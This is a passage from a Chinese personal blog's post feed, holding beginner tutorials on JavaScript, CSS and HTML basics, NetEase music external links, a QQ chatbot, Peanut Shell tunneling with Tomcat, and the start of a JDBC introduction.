href="#弹窗" class="headerlink" title="弹窗"></a>弹窗</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;p id=&quot;demo&quot;&gt;&lt;/p&gt;&lt;button type=&quot;button&quot; onclick=&quot;f()&quot;&gt;确定&lt;/button&gt;&lt;!--加载式弹窗--&gt;&lt;script type=&quot;text/javascript&quot;&gt;    window.alert(&#39;你好&#39;);&lt;/script&gt;&lt;!--事件式弹窗--&gt;&lt;script type=&quot;text/javascript&quot;&gt;    function f() {        var x= confirm(&quot;按下了按钮&quot;);//confirf函数中返回的是true/false值        if (x=true)        {            x=&quot;你按下了确定按钮&quot;;        }        else        {            x=&quot;你按的不是确定按钮&quot;;        }        document.getElementById(&quot;demo&quot;).innerHTML=x;    }&lt;/script&gt;&lt;!--输入式弹窗--&gt;&lt;script type=&quot;text/javascript&quot;&gt; var y=prompt(); document.write(y)&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;  检查当前cookie是否可用&lt;script&gt;function checkCookies(){    if (navigator.cookieEnabled==true){        alert(&quot;Cookies 可用&quot;)    }    else{        alert(&quot;Cookies 不可用&quot;)    }}&lt;/script&gt;</code></pre><h3 id="JS中的页面前进与后退"><a href="#JS中的页面前进与后退" class="headerlink" title="JS中的页面前进与后退"></a>JS中的页面前进与后退</h3><pre><code>实现界面的专挑可以使用a标签，添加指定的跳转页面，当然用JS也是可以进行界面跳转的设置。  window.history函数&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;button type=&quot;button&quot; onclick=&quot;f()&quot;&gt;返回&lt;/button&gt;&lt;script type=&quot;text/javascript&quot;&gt;    function f() {        //返回后一个界面        window.history.back();    }    function b() {        //前进上一个界面        window.history.forward();    }&lt;/script&gt;&lt;!--function a(){    history.go(1);  // go() 里面的参数表示跳转页面的个数 例如 history.go(1) 表示前进一个页面}function b(){    history.go(-1);  // go() 里面的参数表示跳转页面的个数 例如 history.go(-1) 表示后退一个页面}--&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="获取当前浏览器URL"><a href="#获取当前浏览器URL" class="headerlink" title="获取当前浏览器URL"></a>获取当前浏览器URL</h3><p>ocation.hostname 返回 web 主机的域名  </p><p>location.pathname 返回当前页面的路径和文件名 </p><p>location.port 返回 web 主机的端口 （80 或 443）</p><p>location.protocol 返回所使用的 web 协议（http: 或 https:）</p><pre><code>返回（当前页面的）整个 URL：&lt;script&gt;document.write(location.href);&lt;/script&gt;返回当前 URL 的路径名：&lt;script&gt;document.write(location.pathname);&lt;/script&gt;重定向一个网页function f1() {    window.location.assign(&quot;http://www.baidu.com&quot;);}</code></pre><h3 id="获取屏幕的高和宽-px"><a href="#获取屏幕的高和宽-px" class="headerlink" title="获取屏幕的高和宽(px)"></a>获取屏幕的高和宽(px)</h3><p>screen.availWidth - 可用的屏幕宽度<br>screen.availHeight - 可用的屏幕高度  </p><pre><code>例：&lt;script&gt;document.write(&quot;可用高度: &quot; + screen.availHeight);&lt;/script&gt;</code></pre><h3 id="字符串查询"><a href="#字符串查询" class="headerlink" title="字符串查询"></a>字符串查询</h3><p>test()<br>test()方法搜索字符串指定的值，根据结果并返回真或假。  </p><p>exec()<br>exec() 方法检索字符串中的指定值。返回值是被找到的值。如果没有发现匹配，则返回 null。<br>使用方法：当定义了一个变量var x=”xxxxx”；<br>document.write(x.test(‘参数’))；  </p><h3 id="算术函数"><a href="#算术函数" class="headerlink" title="算术函数"></a>算术函数</h3><p>round()<br>使用 round()。</p><p>random()<br>使用 random() 来返回 0 到 1 之间的随机数。</p><p>max()<br>如何使用 max() 来返回两个给定的数中的较大的数。（在 ECMASCript v3 之前，该方法只有两个参数。）</p><p>min()<br>如何使用 min() 来返回两个给定的数中的较小的数。（在 ECMASCript v3 之前，该方法只有两个参数。）</p><h3 id="点击事件的创建"><a href="#点击事件的创建" class="headerlink" title="点击事件的创建"></a>点击事件的创建</h3><pre><code>&lt;script&gt;document.getElementById(&quot;myBtn&quot;).addEventListener(&quot;click&quot;, displayDate);function displayDate() {    document.getElementById(&quot;demo&quot;).innerHTML = Date();}&lt;/script&gt;</code></pre><h4 id="文本修改事件"><a href="#文本修改事件" class="headerlink" title="文本修改事件"></a>文本修改事件</h4><pre><code>&lt;h1 onclick=&quot;this.innerHTML=&#39;Ooops!&#39;&quot;&gt;点击文本!&lt;/h1&gt;</code></pre><p>你可以点击下面的文字进行测试！</p><p></p><h1 onclick="this.innerHTML='Ooops!'">点击文本!</h1><p></p><h4 id="鼠标事件"><a href="#鼠标事件" class="headerlink" title="鼠标事件"></a>鼠标事件</h4><pre><code> 1. 函数使用&lt;input 文本框，当时鼠标离开文本框时，事件触发，    该函数的作用是将大小写进行转换&lt;script&gt;function myFunction(){    var x=document.getElementById(&quot;fname&quot;);    x.value=x.value.toUpperCase();}&lt;/script&gt;2. div onmouseover=&quot;mOver(this)&quot; onmouseout=&quot;mOut(this)&quot; style=&quot;background-color:#D94A38;width:120px;height:20px;padding:40px;&quot;&gt;Mouse Over Me&lt;/div&gt;&lt;script&gt;function mOver(obj){    obj.innerHTML=&quot;Thank You&quot;}function mOut(obj){    obj.innerHTML=&quot;Mouse Over Me&quot;}&lt;/script&gt;&lt;/body&gt;</code></pre><h3 id="样式的改变"><a href="#样式的改变" class="headerlink" title="样式的改变"></a>样式的改变</h3><pre><code>改变 HTML 样式如需改变 HTML 元素的样式，请使用这个语法：document.getElementById(id).style.property=新样式</code></pre><h3 id="JS实例"><a href="#JS实例" class="headerlink" title="JS实例"></a>JS实例</h3><p><a href="https://www.runoob.com/js/js-examples.html" target="_blank" rel="noopener">菜鸟</a></p>]]></content>
      
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 语法 </tag>
            
            <tag> JS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JS快速入门</title>
      <link href="/2019/08/28/web/html3/"/>
      <url>/2019/08/28/web/html3/</url>
      
        <content type="html"><![CDATA[<h3 id="JS变量"><a href="#JS变量" class="headerlink" title="JS变量"></a>JS变量</h3><pre><code>在js当中没有特殊的数据类型声明方式，所有类型的数据都以var命名  例如：var a = 0；  js基础与Java语法类似</code></pre><h3 id="弹窗-输出"><a href="#弹窗-输出" class="headerlink" title="弹窗/输出"></a>弹窗/输出</h3><pre><code>1. 简单的弹窗 （1）&lt;script type=&quot;text/javascript&quot;&gt;    alert(&#39;hello word！&#39;);&lt;/script&gt; （2）&lt;script type=&quot;text/javascript&quot;&gt;    window.alert(&#39;hello word！&#39;);&lt;/script&gt;2. 向HTML元素中写入 &lt;script type=&quot;text/javascript&quot;&gt;  document.write(&quot;今天是个好日子！&quot;);&lt;/script&gt;3. 打印到控制台 &lt;script type=&quot;text/javascript&quot;&gt;  console.log(&#39;你好陌生人！&#39;);&lt;/script&gt;</code></pre><h3 id="修改标签元素"><a href="#修改标签元素" class="headerlink" title="修改标签元素"></a>修改标签元素</h3><p><img src="http://img.ahdy.top/2019-08-29_100217.png" alt><br><img src="http://img.ahdy.top/2019-08-29_100300.png" alt></p><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><pre><code>(1)var length = 16;                                  // Number 通过数字字面量赋值 var points = x * 10;                              // Number 通过表达式字面量赋值var lastName = &quot;Johnson&quot;;                         // String 通过字符串字面量赋值var cars = [&quot;Saab&quot;, &quot;Volvo&quot;, &quot;BMW&quot;];              // Array  通过数组字面量赋值var person = {firstName:&quot;John&quot;, lastName:&quot;Doe&quot;};  // Object 通过对象字面量赋值(2)值类型(基本类型)：字符串（String）、数字(Number)、布尔(Boolean)、对空（Null）、未定义（Undefined）、Symbol。引用数据类型：对象(Object)、数组(Array)、函数(Function)。</code></pre><h4 id="Aarray数组"><a href="#Aarray数组" class="headerlink" title="Aarray数组"></a>Aarray数组</h4><pre><code>var sum =new Array();</code></pre><h4 id="JS字符串"><a href="#JS字符串" class="headerlink" title="JS字符串"></a>JS字符串</h4><p>关于字符串的定义可以使用单引号或者双引号；  </p><pre><code>一般形式为：  var carname=&quot;Volvo XC60&quot;;var carname=&#39;Volvo XC60&#39;;代码        输出\&#39;        单引号\&quot;        双引号\\        反斜杠\n        换行\r        回车\t        tab(制表符)\b        退格符\f        换页符</code></pre><h4 id="字符串对象"><a href="#字符串对象" class="headerlink" title="字符串对象"></a>字符串对象</h4><pre><code>var y = new String(&quot;John&quot;);</code></pre><h4 id="JS函数"><a href="#JS函数" class="headerlink" title="JS函数"></a>JS函数</h4><pre><code>function myFunction(a, b) {return a * b;                                // 返回 a 乘以 b 的结果}</code></pre><h3 id="常见关键字"><a href="#常见关键字" class="headerlink" title="常见关键字"></a>常见关键字</h3><pre><code>break    用于跳出循环。catch    语句块，在 try 语句块执行出错时执行 catch 语句块。continue    跳过循环中的一个迭代。do ... while    执行一个语句块，在条件语句为 true 时继续执行该语句块。for    在条件语句为 true 时，可以将代码块执行指定的次数。for ... in    用于遍历数组或者对象的属性（对数组或者对象的属性进行循环操作）。function    定义一个函数if ... else    用于基于不同的条件来执行不同的动作。return    退出函数switch    用于基于不同的条件来执行不同的动作。throw    抛出（生成）错误 。try        实现错误处理，与 catch 一同使用。var        声明一个变量。while    当条件语句为 true 时，执行语句块。</code></pre><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>JS当中的注释与Java注释一致<br>    1.单行注释<br>//<br>    2.<br>多行注释以<code>/* 开始，以 */ 结尾。</code>    </p><h3 id="对象的定义"><a href="#对象的定义" class="headerlink" title="对象的定义"></a>对象的定义</h3><pre><code>var person = {firstName:&quot;John&quot;,lastName:&quot;Doe&quot;,age:50,eyeColor:&quot;blue&quot;};</code></pre><p>对象属性的定义它可以是对某一事物的描述，有点像java里面的泛型..</p><h3 id="JS函数的调用"><a href="#JS函数的调用" class="headerlink" title="JS函数的调用"></a>JS函数的调用</h3><pre><code>(弹窗函数的调用)&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;meta charset=&quot;UTF-8&quot;&gt;&lt;title&gt;My frist javascript&lt;/title&gt;&lt;script type=&quot;text/javascript&quot;&gt;  function f() {      window.alert(&#39;按钮弹窗测试！&#39;)  }&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;button onclick=&quot;f()&quot; &gt;点我&lt;/button&gt;&lt;/body&gt;&lt;/html&gt;(带参函数的调用,document不能写在标签元素之前，不然控制台会报错，《innerhtml 值为空！》)&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;meta charset=&quot;UTF-8&quot;&gt;&lt;title&gt;My frist javascript&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;p id=&quot;1&quot;&gt;&lt;/p&gt;&lt;script type=&quot;text/javascript&quot;&gt;function f(a,b) {    return a*b;}document.getElementById(&quot;1&quot;).innerHTML=f(4,3);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h4 id="函数作用域"><a href="#函数作用域" class="headerlink" title="函数作用域"></a>函数作用域</h4><p>js当中的函数同Java一样，也分为全局/局部变量</p><h3 id="JS事件"><a href="#JS事件" class="headerlink" title="JS事件"></a>JS事件</h3><pre><code>onchange    HTML 元素改变onclick    用户点击 HTML 元素onmouseover    用户在一个HTML元素上移动鼠标onmouseout    用户从一个HTML元素上移开鼠标onkeydown    用户按下键盘按键onload    浏览器已完成页面的加载</code></pre><p>例子：<br><img src="http://img.ahdy.top/2019-08-29_110209.png" alt></p><h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><p>运算符基本与Java一致，JS当中也支持三元运算符<br><code>voteable=(age&lt;18)?&quot;年龄太小&quot;:&quot;年龄已达到&quot;;</code></p><h3 id="检查数据类型"><a href="#检查数据类型" class="headerlink" title="检查数据类型"></a>检查数据类型</h3><p>你可以使用 typeof关键字来查看一个数据的数据类型  </p><pre><code>例如：typeof &quot;John&quot;                // 返回 string typeof 3.14                  // 返回 numbertypeof false                 // 返回 booleantypeof [1,2,3,4]             // 返回 objecttypeof {name:&#39;John&#39;, age:34} // 返回 object</code></pre><h3 id="类型强转"><a href="#类型强转" class="headerlink" title="类型强转"></a>类型强转</h3><pre><code>在 JavaScript 中有 5 种不同的数据类型：stringnumberbooleanobjectfunction3 种对象类型：ObjectDateArray2 个不包含任何值的数据类型：nullundefined</code></pre><p>例：<br>String(a);<br>Number(b);</p><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>对于JS代码调试，组好的方法就是使用chrome +F12<br>或者使用断点+console.log(打印输出)；</p>]]></content>
      
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 语法 </tag>
            
            <tag> JS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网易音乐外链获取</title>
      <link href="/2019/08/23/link/"/>
      <url>/2019/08/23/link/</url>
      
        <content type="html"><![CDATA[<h3 id="外链简述"><a href="#外链简述" class="headerlink" title="外链简述"></a>外链简述</h3><pre><code>以下内容来源于百度百科</code></pre><p>外链就是指在别的网站导入自己网站的链接。导入链接对于网站优化来说是非常重要的一个过程。导入链接的质量（即导入链接所在页面的权重）间接影响了我们的网站在搜索引擎中的权重。<br>外链是互联网的血液，是链接的一种。没有链接的话，信息就是孤立的，结果就是我们什么都看不到。一个网站是很难做到面面俱到的，因此需要链接到别的网站，将其他网站所能补充的信息吸收过来，连接外链不在于数量，而是在于链接外链的质量。<br>外链的效果不只是为了提高网站的权重，也不仅仅是为了提高某个关键词的排名。一个高质量的外部链接是可以给网站带来很好的流量。</p><h3 id="获取网易云音乐外链"><a href="#获取网易云音乐外链" class="headerlink" title="获取网易云音乐外链"></a>获取网易云音乐外链</h3><p>假如你需要开发一个有特色的网站，那么避免不了外链元素的加入，这些外链，可以是图片超链接，可以是域名，或是各大知名网站的Url，正是这些外链，体现了万物互联的姿态。  </p><pre><code>当你的网页上有一个音乐播放模块，你想加入你喜欢的音乐，这该怎么办呢？  </code></pre><ol><li>打开百度搜索引擎，搜索网易云音乐</li><li>这时候点击一首歌，生成外链播放器，会发现由于版权问题不能生成音乐播放器的外链。<br><img src="http://img.ahdy.top/2019-08-23_200547.png" alt>  </li><li>这时候请注意浏览器URL地址栏，将浏览器内的id=？？后的数字记下，替换掉下面给出的URL地址中id的值，此时下面的音乐URL就变成了你想播放音乐的外链！<br><img src="http://img.ahdy.top/2019-08-23_201113.png" alt><br> <code>http://music.163.com/song/media/outer/url?id=将数值替换掉此处中文.mp3</code>  </li><li>测试外链<br><img src="http://img.ahdy.top/2019-08-23_202852.png" alt><br>5.外链成功播放音乐~<br><img src="http://img.ahdy.top/2019-08-23_202943.png" alt></li></ol>]]></content>
      
      
      <categories>
          
          <category> Url </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Url </tag>
            
            <tag> 外链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS快速入门</title>
      <link href="/2019/08/22/web/html2/"/>
      <url>/2019/08/22/web/html2/</url>
      
        <content type="html"><![CDATA[<h3 id="CSS简介"><a href="#CSS简介" class="headerlink" title="CSS简介"></a>CSS简介</h3><pre><code>        CSS 指层叠样式表(Cascading Style sheets)        定义样式如何显示HTML。更好的渲染html页面，让它看上去更加的绚丽多彩。        有3种展示展示方式：        1.外部样式            定义在以.css为后缀的文件当中，然后在.html为后缀的文件中引入。            方便维护。提高工作效率        2.内部样式            写在html文件中的head标记中。        3.内联样式            写在html标签中。        通常css样式可以写在.css文件当中，也可以在HTML文件当中，使用&lt;style&gt;标签来声明。</code></pre><h3 id="HTML样式嵌入"><a href="#HTML样式嵌入" class="headerlink" title="HTML样式嵌入"></a>HTML样式嵌入</h3><p>如图，是js以及css样式内部写法，当然也可以将其放在.js/.cs文件夹内，通过link/script标签将其引入，这种写法就达到了一种封装设计理念!<br><img src="http://img.ahdy.top/2019-08-23_084436.png" alt></p><h3 id="CSS常用标签"><a href="#CSS常用标签" class="headerlink" title="CSS常用标签"></a>CSS常用标签</h3><h4 id="display-visibility"><a href="#display-visibility" class="headerlink" title="display/visibility"></a>display/visibility</h4><p><img src="http://img.ahdy.top/2019-08-23_085658.png" alt><br>可能效果不是太明显，大概意思就是，&lt;span 标签经过css样式修饰后有了和&lt;p 标签一样的属性，注*span标签是没有任何属性的一个标签，通常被用来提示，脚注等<br><img src="http://img.ahdy.top/2019-08-23_090419.png" alt>  </p><p><img src="http://img.ahdy.top/2019-08-23_091422.png" alt></p><h4 id="背景颜色"><a href="#背景颜色" class="headerlink" title="背景颜色"></a>背景颜色</h4><p>可以通过两种方式来设置背景颜色，背景颜色可以被细分为全局颜色，和局部颜色<br><img src="http://img.ahdy.top/2019-08-23_092502.png" alt><br><img src="http://img.ahdy.top/2019-08-23_092520.png" alt="效果图"></p><h4 id="背景图片"><a href="#背景图片" class="headerlink" title="背景图片"></a>背景图片</h4><p>假如你有一个喜欢的图片想将它作为背景图片,可以通过这种方式<br><img src="http://img.ahdy.top/2019-08-23_094235.png" alt><br>其大小根据百分比设定，直接使用了&lt;body标签命名样式所以不再需要样式引入！  </p><h4 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h4><p><img src="http://img.ahdy.top/2019-08-23_101443.png" alt><br><img src="http://img.ahdy.top/2019-08-23_101508.png" alt="样式展示"></p><h4 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h4><p><img src="http://img.ahdy.top/2019-08-23_100037.png" alt><br><img src="http://img.ahdy.top/2019-08-23_100147.png" alt="效果展示"><br><img src="http://img.ahdy.top/2019-08-23_100626.png" alt><br><img src="http://img.ahdy.top/2019-08-23_100711.png" alt="效果展示"></p><h4 id="按钮"><a href="#按钮" class="headerlink" title="按钮"></a>按钮</h4><p><img src="http://img.ahdy.top/2019-08-23_101036.png" alt><br><img src="http://img.ahdy.top/2019-08-23_101049.png" alt="样式展示"></p><h4 id="滚动框"><a href="#滚动框" class="headerlink" title="滚动框"></a>滚动框</h4><p><img src="http://img.ahdy.top/2019-08-23_102356.png" alt><br><img src="http://img.ahdy.top/2019-08-23_102604.png" alt="效果展示"></p><h4 id="文本居中"><a href="#文本居中" class="headerlink" title="文本居中"></a>文本居中</h4><p><img src="http://img.ahdy.top/2019-08-23_102855.png" alt></p><h4 id="超链接样式"><a href="#超链接样式" class="headerlink" title="超链接样式"></a>超链接样式</h4><p><img src="http://img.ahdy.top/2019-08-23_103428.png" alt></p><h3 id="盒子模型"><a href="#盒子模型" class="headerlink" title="盒子模型"></a>盒子模型</h3><p><img src="http://img.ahdy.top/2019-08-23_103601.png" alt="盒模型"><br>这个概念主要应用在padding/margin上，padding意为间距，其排版为顺时针，也就是上左下又，经常可见padding参数中有四个px参数，margin也是如此，区别是margin是外边距，padding是内边距，&lt;div标签可以形象展示，通俗点说，padding是盒子内部的间距，margin是盒子相对于其他元素间的间距。</p>]]></content>
      
      
      <categories>
          
          <category> CSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 语法 </tag>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML快速入门</title>
      <link href="/2019/08/21/web/html/"/>
      <url>/2019/08/21/web/html/</url>
      
        <content type="html"><![CDATA[<h3 id="什么是HTML5语言"><a href="#什么是HTML5语言" class="headerlink" title="什么是HTML5语言"></a>什么是HTML5语言</h3><pre><code>    HTML是一种标记语言，用于网络渲染界面呈现具体图形，网络流，文字等信息给用户查阅的一种    浏览器解释运行的弱语言。    HTML文件必须以.html或者.htm为后缀。但是.htm是很多年以前过时的写法，一些浏览器也兼容    但是不建议使用.htm的后缀</code></pre><h3 id="什么是CSS3"><a href="#什么是CSS3" class="headerlink" title="什么是CSS3"></a>什么是CSS3</h3><pre><code>    用于渲染页面的色彩、样式等规则。总结：用于美化页面    老师形象的把css样式比喻成女生的化妆品。</code></pre><h3 id="什么是JS-JavaScript"><a href="#什么是JS-JavaScript" class="headerlink" title="什么是JS(JavaScript)"></a>什么是JS(JavaScript)</h3><pre><code>    可以动态渲染页面的一种弱类型语言。    是页面的行为。    HTML5 + CSS3 是静态页面，不能与用户进行交互。    而使用JS后，可以与用户进行交互。</code></pre><h3 id="HTML文本标签"><a href="#HTML文本标签" class="headerlink" title="HTML文本标签"></a>HTML文本标签</h3><p><img src="http://img.ahdy.top/2019-08-20_154347.png" alt></p><h3 id="HTML超链接"><a href="#HTML超链接" class="headerlink" title="HTML超链接"></a>HTML超链接</h3><p><img src="http://img.ahdy.top/2019-08-20_160811.png" alt></p><h3 id="HTML列表"><a href="#HTML列表" class="headerlink" title="HTML列表"></a>HTML列表</h3><p><img src="http://img.ahdy.top/2019-08-20_173123.png" alt></p><h3 id="HTML5新特性"><a href="#HTML5新特性" class="headerlink" title="HTML5新特性"></a>HTML5新特性</h3><p><img src="http://img.ahdy.top/2019-08-20_173908.png" alt></p><h3 id="HTML页面框架"><a href="#HTML页面框架" class="headerlink" title="HTML页面框架"></a>HTML页面框架</h3><p>你需要创建几个HTML页面，并在frameset标签下引入，标签的头部可以使用比例进行排版<br>注意该标签不能放在&lt;body 标签下使用<br><img src="http://img.ahdy.top/2019-08-20_175443.png" alt></p><h3 id="常用权重标签"><a href="#常用权重标签" class="headerlink" title="常用权重标签"></a>常用权重标签</h3><h4 id="div"><a href="#div" class="headerlink" title="div"></a>div</h4><p><img src="http://img.ahdy.top/2019-08-20_182454.png" alt></p><h4 id="form"><a href="#form" class="headerlink" title="form"></a>form</h4><p><img src="http://img.ahdy.top/2019-08-20_182559.png" alt></p><h4 id="iframe"><a href="#iframe" class="headerlink" title="iframe"></a>iframe</h4><p>外边框<br><img src="http://img.ahdy.top/2019-08-20_182804.png" alt></p><h4 id="nav"><a href="#nav" class="headerlink" title="nav"></a>nav</h4><p>横向排版超链接<br><img src="http://img.ahdy.top/2019-08-21_111503.png" alt></p><h4 id="下拉选项"><a href="#下拉选项" class="headerlink" title="下拉选项"></a>下拉选项</h4><p><img src="http://img.ahdy.top/2019-08-21_111557.png" alt></p><h4 id="progress"><a href="#progress" class="headerlink" title="progress"></a>progress</h4><p>加载进度条<br><img src="http://img.ahdy.top/2019-08-21_121831.png" alt></p><h4 id="textarea"><a href="#textarea" class="headerlink" title="textarea"></a>textarea</h4><p>文本框<br><img src="http://img.ahdy.top/2019-08-21_171250.png" alt></p><h4 id="input"><a href="#input" class="headerlink" title="input"></a>input</h4><p>极为重要的签，功能强大<br><img src="http://img.ahdy.top/2019-08-21_172002.png" alt><br>效果预览<br><img src="http://img.ahdy.top/2019-08-21_172100.png" alt></p><h4 id="lable"><a href="#lable" class="headerlink" title="lable"></a>lable</h4><p><img src="http://img.ahdy.top/2019-08-21_172325.png" alt></p><h4 id="table"><a href="#table" class="headerlink" title="table"></a>table</h4><p>表格<br><img src="http://img.ahdy.top/2019-08-21_172524.png" alt><br>效果预览<br><img src="http://img.ahdy.top/2019-08-21_172538.png" alt></p><h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><p>单纯的HTML是否显得过于简陋？，怎样使页面变得美观绚丽？</p>]]></content>
      
      
      <categories>
          
          <category> HTML </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 语法 </tag>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QQ机器人</title>
      <link href="/2019/08/20/robot/"/>
      <url>/2019/08/20/robot/</url>
      
        <content type="html"><![CDATA[<p>你是否见过QQ上的qq小冰呢！你是否也想拥有一个自己的机器人的呢！<br>下面我将告诉你，怎么一行代码都不写就实现一个QQ机器人</p><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><ol><li>工具需要，酷Q插件+图灵机器人api</li><li>步骤，百度一下入图灵机器人官网，注册一个账号，这个实名注册一下，一天有100条免费消息，嗯以前是500条就在前不久，官方说机器人资源泛滥，决定调整，它这个意思很明确，咱用免费的就可以了，（实名认证一般一天之内就能认证成功）<br><img src="http://img.ahdy.top/201908201.png" alt></li><li>这时候我相信你已经注册，并且实名认证成功了，接下来就选择创建一个机器人<br><img src="http://img.ahdy.top/2001908202.png" alt></li><li>这些选项可以根据自己的需求去选，它这个语言库可能有区别<br>创建好了之后，百度下载一个叫酷Q的插件（这个插件可以登陆QQ号）<br>登上去你的这个QQ它就变成了机器人<br><img src="http://img.ahdy.top/201908203.png" alt></li><li>登录以后配置它<br><img src="http://img.ahdy.top/201908204.png" alt><br>进入图灵官网找到apikey<br><img src="http://img.ahdy.top/201908205.png" alt></li><li>将你创建好的机器人api密匙复制到下图apykey处选择保存<br><img src="http://img.ahdy.top/201908206.png" alt></li><li>使用QQ对当前机器人发送消息：<br><img src="http://img.ahdy.top/201908207.png" alt><br>8.QQ机器人创建完成！</li></ol>]]></content>
      
      
      <categories>
          
          <category> robot </category>
          
      </categories>
      
      
        <tags>
            
            <tag> API </tag>
            
            <tag> 机器人 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>花生壳内网穿透</title>
      <link href="/2019/08/15/web/sever/"/>
      <url>/2019/08/15/web/sever/</url>
      
        <content type="html"><![CDATA[<h3 id="花生壳下载"><a href="#花生壳下载" class="headerlink" title="花生壳下载"></a>花生壳下载</h3><p>下载了这个软件你将会获得免费域名，端口映射服务大礼包，听起来是不是很炫酷(虽然这个域名不怎么好，但是我们目的很简单能用就OK！)<a href="https://hsk.oray.com/" target="_blank" rel="noopener">下载地址</a><br>嗯，下载，安装，注册个账号都会吧！不用教了呗！<br>实在不会可以戳这儿<a href="https://blog.csdn.net/niaonao/article/details/91411044" target="_blank" rel="noopener">详细图文教程</a></p><h3 id="花生壳配置"><a href="#花生壳配置" class="headerlink" title="花生壳配置"></a>花生壳配置</h3><p>这个配置非常简单,傻瓜式流程  </p><p><img src="http://img.ahdy.top/2019-08-15_213709.png" alt><br><img src="https://raw.githubusercontent.com/niaonao/ImageIcon/master/IDEAProject/Wechat/Image11.png#pic_center" alt><br>确定完成配置。</p><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p>你的电脑是WiFi就选择无限局域网的ip地址，如果是网线就选择以太网内的ip地址！<br><img src="http://img.ahdy.top/2019-08-15_215931.png" alt><br>接下来你就要诊断创建实例的各项指标是否正常，我敢说绝对会不正常，不要问我为啥，因为你电脑没有局域网服务，不服可以来打我。  </p><h3 id="环境诊断"><a href="#环境诊断" class="headerlink" title="环境诊断"></a>环境诊断</h3><p><img src="http://img.ahdy.top/2019-08-15_215041.png" alt>  </p><p><img src="http://img.ahdy.top/2019-08-15_215118.png" alt><br>如果没猜错你会出现跟我一模一样的情况，下面我教你用最简单的方式把web项目托管的环境搭建好！</p><h3 id="服务器搭建"><a href="#服务器搭建" class="headerlink" title="服务器搭建"></a>服务器搭建</h3><p><a href="https://share.weiyun.com/57Wjpp2" target="_blank" rel="noopener">tomcat7</a>请务必把它下载下来，是个压缩包，解压即用，别说你不会解压昂！<br>下载解压好如下<br><img src="http://img.ahdy.top/2019-08-15_220438.png" alt><br>web项目放在下图路径内<br><img src="http://img.ahdy.top/2019-08-15_220553.png" alt><br>进入下图路径修改server.xml<br><img src="http://img.ahdy.top/2019-08-15_220953.png" alt><br>把带有80端口的代码块复制粘贴一份，将80端口改为8080，跟图一样保存退出（至关重要）<br><img src="http://img.ahdy.top/2019-08-15_221155.png" alt><br>回到wbesver文件下选择启动服务<br><img src="http://img.ahdy.top/2019-08-15_220822.png" alt><br>出现黑窗口，显示运行秒数则服务启动成功<br><img src="http://img.ahdy.top/2019-08-15_221702.png" alt><br>中间如果弹出防火墙阻止，请选择服务允许访问<br>我们再来检查诊断一下实例发现所有项都已经配置成功<br><img src="http://img.ahdy.top/2019-08-15_221847.png" alt><br>使用域名，或者你本机的ip地址就可以访问你的web项目了<br>下面是我的测试页面<br><img src="http://img.ahdy.top/2019-08-15_222123.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 花生壳 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境 </tag>
            
            <tag> 服务器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL进阶</title>
      <link href="/2019/08/12/web/mysql3/"/>
      <url>/2019/08/12/web/mysql3/</url>
      
        <content type="html"><![CDATA[<h3 id="什么是JBDC"><a href="#什么是JBDC" class="headerlink" title="什么是JBDC"></a>什么是JBDC</h3><p>1、Java Data BaseConnectivity(Java数据库连接)：是java与数据库的桥梁，提供读写操作</p><p>2、JDBC：用于执行SQL语句的Java API，可以为多种关系数据库提供统一访问。通过JDBC可以连接Oracle、MySql、SqlServer数据库</p><p>3、JDBC：应用服务器和数据库DB之间的数据流通过程，实现应用服务器对数据库的操作。  </p><h3 id="JDBC使用"><a href="#JDBC使用" class="headerlink" title="JDBC使用"></a>JDBC使用</h3><p>（需要导入mysql-connector-java-5.1.7-bin的jar包）</p><p>1.加载驱动程序： Class.forName（driverClass）</p><p>加载Mysql驱动：Class.forName(“com.mysql.jdbc.Driver”)</p><p>加载Oracle驱动：Class.forName(“oracle.jdbc.driver.OracleDriver”)</p><p>***注意：驱动是固定写法  